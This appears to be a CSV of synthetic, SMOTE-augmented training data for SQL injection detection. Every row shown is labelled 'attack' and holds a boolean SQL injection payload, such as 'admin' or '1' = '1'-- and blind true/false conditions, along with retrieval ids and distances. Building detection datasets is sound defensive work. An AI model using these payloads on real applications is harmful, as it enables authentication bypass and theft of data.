id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000034,attack,boolean,"admin"" or ""1""  =  ""1""--",nearest_attack_euclidean,R000005,1.7779243616226288
SMOTE_000035,attack,boolean,anything' OR 'x'  =  'x,nearest_attack_euclidean,R000054,0.3573034574199875
SMOTE_000036,attack,boolean,"a' or 1  =  1, --",nearest_attack_euclidean,R000078,0.4149838077606701
SMOTE_000037,attack,boolean,"-2067"" or 3038  =  3038",nearest_attack_euclidean,R000201,0.03895279502036237
SMOTE_000038,attack,boolean,-7187' or 4159  =  7465,nearest_attack_euclidean,R000098,0.013738993536462416
SMOTE_000039,attack,boolean,-5534 or 1983  =  5721#,nearest_attack_euclidean,R000126,0.23380584880151944
SMOTE_000040,attack,boolean,end and   (  9416  =  9416,nearest_attack_euclidean,R000160,0.0
SMOTE_000041,attack,boolean,-4562'  )   or 3038  =  3038,nearest_attack_euclidean,R000187,0.017219132404066
SMOTE_000042,attack,boolean,1%' and 9127  =  7687--,nearest_attack_euclidean,R000155,0.49288521473024816
SMOTE_000043,attack,boolean,admin' or '1'  =  '1'/*,nearest_attack_euclidean,R000087,1.2856258005879098
SMOTE_000044,attack,boolean,-6144'  )   or 9385  =  2474--,nearest_attack_euclidean,R000113,0.1672280577692208
SMOTE_000045,attack,boolean,-9950' or 4425  =  1975,nearest_attack_euclidean,R000121,0.032950516737872325
SMOTE_000046,attack,boolean,"-5755"" or 3581  =  7566",nearest_attack_euclidean,R000293,0.020825513439337504
SMOTE_000047,attack,boolean,1%'  )   and 9198  =  9198--,nearest_attack_euclidean,R000205,1.477699469337843
SMOTE_000048,attack,boolean,or 3  =  3,nearest_attack_euclidean,R000025,0.22847859687572933
SMOTE_000049,attack,boolean,"-7939""  )   or 3958  =  6909",nearest_attack_euclidean,R000235,0.08372275571080319
SMOTE_000050,attack,boolean,â or 3  =  3 --,nearest_attack_euclidean,R000035,0.4425568830923774
SMOTE_000051,attack,boolean,? or 1  =  1 --,nearest_attack_euclidean,R000001,1.4600096599955427e-07
SMOTE_000052,attack,boolean,? or 1  =  1 --,nearest_attack_euclidean,R000001,1.1398876175742674
SMOTE_000053,attack,boolean,-2983'  )   or 8571  =  8571--,nearest_attack_euclidean,R000233,0.0003146579498236541
SMOTE_000054,attack,boolean,-8710 or 9323  =  9323#,nearest_attack_euclidean,R000208,0.019556725117256018
SMOTE_000055,attack,boolean,end and 'huti' like 'huti,nearest_attack_euclidean,R000148,0.032861101176689285
SMOTE_000056,attack,boolean,-5534 or 1983  =  5721#,nearest_attack_euclidean,R000126,0.23277762293487922
SMOTE_000057,attack,boolean,-1479%' or 5201  =  3398--,nearest_attack_euclidean,R000159,0.05656377203811142
SMOTE_000058,attack,boolean,admin' or '1'  =  '1,nearest_attack_euclidean,R000014,1.519385504714522
SMOTE_000059,attack,boolean,1' and 7533  =  7533,nearest_attack_euclidean,R000249,0.9196101806006304
SMOTE_000060,attack,boolean," end and ""xlvn""  =  ""xlvn",nearest_attack_euclidean,R000256,1.1920928955078125e-07
SMOTE_000061,attack,boolean,"-6747"" or 9323  =  9323#",nearest_attack_euclidean,R000108,0.0896491434631085
SMOTE_000062,attack,boolean,or 'a'  =  'a,nearest_attack_euclidean,R000043,0.03685274302655074
SMOTE_000063,attack,boolean,"1%""  )   and 9198  =  9198--",nearest_attack_euclidean,R000196,0.02354396363167219
SMOTE_000064,attack,boolean,or 'text'   =   n'text',nearest_attack_euclidean,R000063,0.02058310225193803
SMOTE_000065,attack,boolean,"1%""  )   and 9198  =  9198--",nearest_attack_euclidean,R000196,0.7875593044054414
SMOTE_000066,attack,boolean,1'  )   and 7533  =  7533,nearest_attack_euclidean,R000173,0.12447203437923178
SMOTE_000067,attack,boolean,-1436' or 5699  =  5783--,nearest_attack_euclidean,R000202,0.1482314102957632
SMOTE_000068,attack,boolean,-1219'  )   or 5592  =  4835,nearest_attack_euclidean,R000109,0.016635757438325835
SMOTE_000069,attack,boolean,? or 1  =  1 --,nearest_attack_euclidean,R000001,0.43497429919714947
SMOTE_000070,attack,boolean,"1"" and 6637  =  2321",nearest_attack_euclidean,R000210,1.1595689498073356
SMOTE_000071,attack,boolean,? or 1  =  1 --,nearest_attack_euclidean,R000001,1.4600096599955427e-07
SMOTE_000072,attack,boolean,"-2722""  )   or 4907  =  8126#",nearest_attack_euclidean,R000172,0.5425614108512924
SMOTE_000073,attack,boolean,or 1  =  1 --,nearest_attack_euclidean,R000004,0.3282522094602366
SMOTE_000074,attack,boolean,admin' or 1  =  1/*,nearest_attack_euclidean,R000026,1.2908269559081853
SMOTE_000075,attack,boolean,or 'text'   =   n'text',nearest_attack_euclidean,R000063,0.7514459681907459
SMOTE_000076,attack,boolean,admin'  )   or '1'  =  '1,nearest_attack_euclidean,R000071,1.8791434724206937
SMOTE_000077,attack,boolean,or 1  =  1#,nearest_attack_euclidean,R000090,0.7234856806317891
SMOTE_000078,attack,boolean,admin'  )   or '1'  =  '1,nearest_attack_euclidean,R000071,0.25303443209636634
SMOTE_000079,attack,boolean,-5580 or 4829  =  1968,nearest_attack_euclidean,R000151,5.960464477539063e-08
SMOTE_000080,attack,boolean,-5031' or 9323  =  9323#,nearest_attack_euclidean,R000223,0.17276688233385468
SMOTE_000081,attack,boolean,1  )   and 2006  =  2006,nearest_attack_euclidean,R000222,0.2485119614047783
SMOTE_000082,attack,boolean," end and ""xlvn""  =  ""xlvn",nearest_attack_euclidean,R000256,0.11175177876093292
SMOTE_000083,attack,boolean,"1%""  )   and 9198  =  9198--",nearest_attack_euclidean,R000196,0.7930196663196671
SMOTE_000084,attack,boolean,-7187' or 4159  =  7465,nearest_attack_euclidean,R000098,0.0
SMOTE_000085,attack,boolean,-6030%'  )   or 3038  =  3038,nearest_attack_euclidean,R000127,1.1872450376344692
SMOTE_000086,attack,boolean,-7999  )   or 8422  =  1336,nearest_attack_euclidean,R000093,0.10958596259490988
SMOTE_000087,attack,boolean,-3895'  )   or 8645  =  5359--,nearest_attack_euclidean,R000270,1.750741099323588
SMOTE_000088,attack,boolean,1'  )   and 2564  =  3234--,nearest_attack_euclidean,R000264,1.2185074415219541
SMOTE_000089,attack,boolean,-5356'  )   or 9323  =  9323#,nearest_attack_euclidean,R000188,0.17758416299715948
SMOTE_000090,attack,boolean,"admin"" or ""1""  =  ""1""--",nearest_attack_euclidean,R000005,1.132106875406036
SMOTE_000091,attack,boolean,-8639  )   or 8138  =  6252,nearest_attack_euclidean,R000288,0.13352745262620414
SMOTE_000092,attack,boolean, or userid like '%,nearest_attack_euclidean,R000065,1.0796200095569852
SMOTE_000093,attack,boolean,end and   (  'nchh'  =  'nchh,nearest_attack_euclidean,R000139,0.23756111678415917
SMOTE_000094,attack,boolean,"-7939""  )   or 3958  =  6909",nearest_attack_euclidean,R000235,0.21695668752722505
SMOTE_000095,attack,boolean,"-9265""  )   or 7834  =  1685",nearest_attack_euclidean,R000194,0.3142196191647877
SMOTE_000096,attack,boolean,1 and 5934  =  7745,nearest_attack_euclidean,R000123,0.007601163260904525
SMOTE_000097,attack,boolean,1' and 5967  =  4184#,nearest_attack_euclidean,R000099,0.6952963506018075
SMOTE_000098,attack,boolean,"admin"" or ""1""  =  ""1""--",nearest_attack_euclidean,R000005,1.6459432301578423
SMOTE_000099,attack,boolean,"-3347%"" or 9323  =  9323#",nearest_attack_euclidean,R000158,1.5670894865103078
SMOTE_000100,attack,boolean,"admin"" or 1  =  1/*",nearest_attack_euclidean,R000068,1.8522628470147686
SMOTE_000101,attack,boolean,"-5959"" or 2477  =  1144",nearest_attack_euclidean,R000195,0.10619063107732983
SMOTE_000102,attack,boolean,-9217 or 9323  =  9323#,nearest_attack_euclidean,R000168,0.12466901768075983
SMOTE_000103,attack,boolean, )   or   (  'a'  =  'a,nearest_attack_euclidean,R000002,1.2072694797652939
SMOTE_000104,attack,boolean,"1"" and 9468  =  7105--",nearest_attack_euclidean,R000197,0.3231580254041959
SMOTE_000105,attack,boolean,hi'  )   or   (  'a'  =  'a,nearest_attack_euclidean,R000027,1.6991569515707823
SMOTE_000106,attack,boolean,1%' and 9198  =  9198--,nearest_attack_euclidean,R000214,1.3786053993503802
SMOTE_000107,attack,boolean,or a  =  a--,nearest_attack_euclidean,R000076,0.4345602282951393
SMOTE_000108,attack,boolean,-1436' or 5699  =  5783--,nearest_attack_euclidean,R000202,0.6111674254913927
SMOTE_000109,attack,boolean,-1219'  )   or 5592  =  4835,nearest_attack_euclidean,R000109,0.0318385946831551
SMOTE_000110,attack,boolean,"1%""  )   and 8024  =  3560--",nearest_attack_euclidean,R000091,0.5708235198362462
SMOTE_000111,attack,boolean,1'  )   and 5999  =  5879,nearest_attack_euclidean,R000285,0.021492148644243512
SMOTE_000112,attack,boolean,1'  )   and 1987  =  3756#,nearest_attack_euclidean,R000179,0.4086629451092431
SMOTE_000113,attack,boolean,"1""  )   and 8677  =  9054#",nearest_attack_euclidean,R000240,1.4429900333630887
SMOTE_000114,attack,boolean,or 3  =  3,nearest_attack_euclidean,R000025,1.1920928955078125e-07
SMOTE_000115,attack,boolean,-1772' or 7911  =  4985#,nearest_attack_euclidean,R000242,0.09753911082485138
SMOTE_000116,attack,boolean,1' and 7533  =  7533,nearest_attack_euclidean,R000249,0.995041292035489
SMOTE_000117,attack,boolean,-5356'  )   or 9323  =  9323#,nearest_attack_euclidean,R000188,0.010232728904783323
SMOTE_000118,attack,boolean,""" or 0  =  0 --",nearest_attack_euclidean,R000015,0.6595639729306292
SMOTE_000119,attack,boolean,-3849  )   or 5580  =  3442--,nearest_attack_euclidean,R000144,0.939354172427317
SMOTE_000120,attack,boolean,-4901  )   or 3407  =  6442#,nearest_attack_euclidean,R000226,0.23532030428351824
SMOTE_000121,attack,boolean,or 1  =  1--,nearest_attack_euclidean,R000012,0.5843405162765131
SMOTE_000122,attack,boolean,-6310 or 6715  =  3399,nearest_attack_euclidean,R000141,0.0031699149789093054
SMOTE_000123,attack,boolean,end and 'blit'  =  'blit,nearest_attack_euclidean,R000114,1.3000177947973852
SMOTE_000124,attack,boolean,? or 1  =  1 --,nearest_attack_euclidean,R000001,0.5150921909074265
SMOTE_000125,attack,boolean,-4428  )   or 3038  =  3038,nearest_attack_euclidean,R000181,0.015576188553465712
SMOTE_000126,attack,boolean,"admin"" or 1  =  1",nearest_attack_euclidean,R000028,0.9390310730216848
SMOTE_000127,attack,boolean,or 'text' > 't',nearest_attack_euclidean,R000019,0.7295310046277667
SMOTE_000128,attack,boolean,"or 1  =  1 or """"  =  ",nearest_attack_euclidean,R000006,0.08063738425314546
SMOTE_000129,attack,boolean,1'  )   and 2577  =  7094,nearest_attack_euclidean,R000191,0.42549008350005774
SMOTE_000130,attack,boolean, or 'x'  =  'x,nearest_attack_euclidean,R000077,2.0688615830214854
SMOTE_000131,attack,boolean,-9217 or 9323  =  9323#,nearest_attack_euclidean,R000168,0.17997653984867631
SMOTE_000132,attack,boolean,admin'  )   or '1'  =  '1'/*,nearest_attack_euclidean,R000072,1.4979353917931022
SMOTE_000133,attack,boolean,1  )   and 2006  =  2006,nearest_attack_euclidean,R000222,0.16000765742538925
SMOTE_000134,attack,boolean,-6045 or 8919  =  2827--,nearest_attack_euclidean,R000104,0.855292222997155
SMOTE_000135,attack,boolean, or userid like '%,nearest_attack_euclidean,R000065,0.05081894594026193
SMOTE_000136,attack,boolean, or 'something' like 'some%',nearest_attack_euclidean,R000059,0.595419387695945
SMOTE_000137,attack,boolean,"admin""  )   or ""1""  =  ""1""--",nearest_attack_euclidean,R000081,2.046431650880516
SMOTE_000138,attack,boolean,1  )   and 9198  =  9198--,nearest_attack_euclidean,R000190,0.46994510879064005
SMOTE_000139,attack,boolean,-6144'  )   or 9385  =  2474--,nearest_attack_euclidean,R000113,0.06878522346718094
SMOTE_000140,attack,boolean,1' and 9970  =  3409,nearest_attack_euclidean,R000131,0.055624298612396955
SMOTE_000141,attack,boolean,-8639  )   or 8138  =  6252,nearest_attack_euclidean,R000288,0.09224785087197644
SMOTE_000142,attack,boolean,-9358' or 9887  =  2569--,nearest_attack_euclidean,R000136,0.1033220898027231
SMOTE_000143,attack,boolean,1' and 4374  =  2305,nearest_attack_euclidean,R000115,0.18273371338387917
SMOTE_000144,attack,boolean,-4428  )   or 3038  =  3038,nearest_attack_euclidean,R000181,0.00010718781342710236
SMOTE_000145,attack,boolean,-8023' or 6872  =  6872,nearest_attack_euclidean,R000237,0.01061172615149491
SMOTE_000146,attack,boolean,"-2211"" or 2113  =  8885#",nearest_attack_euclidean,R000295,0.08568238400460843
SMOTE_000147,attack,boolean,or 1 --',nearest_attack_euclidean,R000010,1.2846208037521434
SMOTE_000148,attack,boolean,0 or 1  =  1,nearest_attack_euclidean,R000037,0.2834442258822349
SMOTE_000149,attack,boolean,1' and 1541  =  6868#,nearest_attack_euclidean,R000102,1.2061562984145637
SMOTE_000150,attack,boolean,1%'  )   and 2006  =  2006,nearest_attack_euclidean,R000259,0.3003564197698495
SMOTE_000151,attack,boolean,-7999  )   or 8422  =  1336,nearest_attack_euclidean,R000093,0.041779766781856874
SMOTE_000152,attack,boolean, or 1  =  1 /*,nearest_attack_euclidean,R000041,0.1509871340012456
SMOTE_000153,attack,boolean,"1"" and 6637  =  2321",nearest_attack_euclidean,R000210,0.576286485841437
SMOTE_000154,attack,boolean,-6045 or 8919  =  2827--,nearest_attack_euclidean,R000104,1.2606259867844003
SMOTE_000155,attack,boolean,1%'  )   and 9226  =  7542--,nearest_attack_euclidean,R000257,0.871790512662814
SMOTE_000156,attack,boolean,1%'  )   and 4595  =  4595#,nearest_attack_euclidean,R000212,0.3170740080961429
SMOTE_000157,attack,boolean,or 3  =  3,nearest_attack_euclidean,R000025,0.5546957932239182
SMOTE_000158,attack,boolean,-9358' or 9887  =  2569--,nearest_attack_euclidean,R000136,0.07630816910159911
SMOTE_000159,attack,boolean,1%'  )   and 9198  =  9198--,nearest_attack_euclidean,R000205,0.8612097090858116
SMOTE_000160,attack,boolean,"1""  )   and 4760  =  2922",nearest_attack_euclidean,R000177,0.22548611237369579
SMOTE_000161,attack,boolean,"-2448%""  )   or 3038  =  3038",nearest_attack_euclidean,R000125,0.764678126957013
SMOTE_000162,attack,boolean,-7021' or 3038  =  3038,nearest_attack_euclidean,R000116,0.023602711535795066
SMOTE_000163,attack,boolean,1' and 9970  =  3409,nearest_attack_euclidean,R000131,0.045310515467435974
SMOTE_000164,attack,boolean,-1219'  )   or 5592  =  4835,nearest_attack_euclidean,R000109,0.06204740234674741
SMOTE_000165,attack,boolean,1%'  )   and 9198  =  9198--,nearest_attack_euclidean,R000205,0.656189028467292
SMOTE_000166,attack,boolean,1 and 9198  =  9198--,nearest_attack_euclidean,R000220,1.173864524988192
SMOTE_000167,attack,boolean," end and    (    (   ""%""  =  """,nearest_attack_euclidean,R000103,0.9766097895264715
SMOTE_000168,attack,boolean,end and   (  'uxzv'  =  'uxzv,nearest_attack_euclidean,R000271,0.07073837191062911
SMOTE_000169,attack,boolean,"hi' or 'x'  =  'x',",nearest_attack_euclidean,R000024,0.2823767875521085
SMOTE_000170,attack,boolean,-4428  )   or 3038  =  3038,nearest_attack_euclidean,R000181,0.32710766563018023
SMOTE_000171,attack,boolean,"-4954%""  )   or 5244  =  4832",nearest_attack_euclidean,R000308,0.09464726243998746
SMOTE_000172,attack,boolean,-9721'  )   or 9287  =  4362#,nearest_attack_euclidean,R000261,0.17833796841963306
SMOTE_000173,attack,boolean,-8625 or 3176  =  2519# fvgl,nearest_attack_euclidean,R000215,0.597447065730846
SMOTE_000174,attack,boolean,-5580 or 4829  =  1968,nearest_attack_euclidean,R000151,0.0016942619595909272
SMOTE_000175,attack,boolean,1'  )   and 7533  =  7533,nearest_attack_euclidean,R000173,0.13960189569779718
SMOTE_000176,attack,boolean, or 'x'  =  'x,nearest_attack_euclidean,R000077,1.4947709128299917
SMOTE_000177,attack,boolean,-7021' or 3038  =  3038,nearest_attack_euclidean,R000116,0.03124557168603051
SMOTE_000178,attack,boolean,"admin""  )   or   (  ""1""  =  ""1",nearest_attack_euclidean,R000023,0.420443709440089
SMOTE_000179,attack,boolean,"1""  )   and 8677  =  9054#",nearest_attack_euclidean,R000240,0.7015142092453613
SMOTE_000180,attack,boolean,"-5755"" or 3581  =  7566",nearest_attack_euclidean,R000293,0.005441472419236406
SMOTE_000181,attack,boolean,-5534 or 1983  =  5721#,nearest_attack_euclidean,R000126,0.03167137005902438
SMOTE_000182,attack,boolean,"hi' or 'x'  =  'x',",nearest_attack_euclidean,R000024,3.259535914515307
SMOTE_000183,attack,boolean,-3520%' or 8571  =  8571--,nearest_attack_euclidean,R000301,0.08896976630989908
SMOTE_000184,attack,boolean,-2761 or 1144  =  7657-- mfml,nearest_attack_euclidean,R000119,0.46370893093040955
SMOTE_000185,attack,boolean,"-5959"" or 2477  =  1144",nearest_attack_euclidean,R000195,0.17906674395731642
SMOTE_000186,attack,boolean,1  )   and 2006  =  2006,nearest_attack_euclidean,R000222,0.26397067271528085
SMOTE_000187,attack,boolean,or '1'  =  '1,nearest_attack_euclidean,R000045,0.6202736094253272
SMOTE_000188,attack,boolean,or 3  =  3,nearest_attack_euclidean,R000025,0.02142314281389178
SMOTE_000189,attack,boolean,"-2373%""  )   or 9323  =  9323#",nearest_attack_euclidean,R000221,0.4679947922578518
SMOTE_000190,attack,boolean,admin'  )   or '1'  =  '1'/*,nearest_attack_euclidean,R000072,0.5313365754735443
SMOTE_000191,attack,boolean,1' and 5967  =  4184#,nearest_attack_euclidean,R000099,0.21599460449575483
SMOTE_000192,attack,boolean,-7187' or 4159  =  7465,nearest_attack_euclidean,R000098,0.0
SMOTE_000193,attack,boolean,1 and 9122  =  4153# nxcv,nearest_attack_euclidean,R000279,1.4217838230212616
SMOTE_000194,attack,boolean,1  )   and 3861  =  5813--,nearest_attack_euclidean,R000243,1.1998467301728626
SMOTE_000195,attack,boolean,"-6381%"" or 8571  =  8571--",nearest_attack_euclidean,R000244,1.5306082875603864
SMOTE_000196,attack,boolean,-5031' or 9323  =  9323#,nearest_attack_euclidean,R000223,0.46947244556608736
SMOTE_000197,attack,boolean,-4562'  )   or 3038  =  3038,nearest_attack_euclidean,R000187,0.0036191082354257603
SMOTE_000198,attack,boolean, or 2 > 1,nearest_attack_euclidean,R000053,2.0682871431103407
SMOTE_000199,attack,boolean,1' and 7533  =  7533,nearest_attack_euclidean,R000249,0.0
SMOTE_000200,attack,boolean,-6310 or 6715  =  3399,nearest_attack_euclidean,R000141,0.10724990055321469
